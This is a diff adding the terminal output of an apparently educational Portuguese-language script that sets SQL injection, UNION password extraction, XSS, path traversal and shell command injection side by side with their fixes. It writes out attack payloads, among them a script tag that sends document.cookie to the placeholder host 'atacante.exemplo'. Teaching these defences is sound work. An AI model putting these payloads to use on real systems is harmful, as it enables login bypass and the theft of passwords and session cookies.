@@ -1,0 +1,33 @@
+$ python l06_aplicacoes.py
+== 1. A05 Injecao de SQL: contornar o login ==
+consulta montada por concatenacao: SELECT nome, papel FROM usuarios WHERE nome='ana' AND senha='errada'
+  resultado: nenhuma linha (login negado)
+consulta montada por concatenacao: SELECT nome, papel FROM usuarios WHERE nome='admin' AND senha='' OR '1'='1'
+  resultado: [('ana', 'servidor'), ('admin', 'administrador')]
+consulta montada por concatenacao: SELECT nome, papel FROM usuarios WHERE nome='admin'--' AND senha='qualquer'
+  resultado: [('admin', 'administrador')]
+
+== 2. A mesma entrada contra a consulta parametrizada ==
+entrada ('admin', "' OR '1'='1") -> nenhuma linha (login negado)
+entrada ("admin'--", 'qualquer') -> nenhuma linha (login negado)
+entrada ('ana', 's3cr3ta-ana') -> [('ana', 'servidor')]
+consulta usada: SELECT nome, papel FROM usuarios WHERE nome=? AND senha=? (o valor viaja separado do comando)
+
+== 3. UNION: exfiltrar outra tabela por um parametro de busca ==
+consulta: SELECT id, titulo FROM processos WHERE sigilo=0 AND titulo LIKE '%x%' UNION SELECT id, senha FROM usuarios --%'
+  resultado: [(1, 's3cr3ta-ana'), (2, 'Adm!n-9z')]
+  versao segura: []
+
+== 4. A05 XSS: escapar a saida (codificacao de saida) ==
+sem escape : <p><script>fetch("https://atacante.exemplo/?c="+document.cookie)</script></p>
+com escape : <p>&lt;script&gt;fetch(&quot;https://atacante.exemplo/?c=&quot;+document.cookie)&lt;/script&gt;</p>
+
+== 5. A01 Travessia de diretorio (path traversal) ==
+vulneravel, nome='edital.txt'      -> edital publico
+vulneravel, nome='../segredo.txt'  -> conteudo interno
+seguro,     nome='edital.txt'      -> edital publico
+seguro,     nome='../segredo.txt'  -> PermissionError: fora do diretorio permitido
+
+== 6. Injecao de comando: shell=True x lista de argumentos (so executa echo) ==
+shell=True    -> 'arquivo: relatorio\nCOMANDO-INJETADO\n'
+lista de args -> 'arquivo: relatorio; echo COMANDO-INJETADO\n'
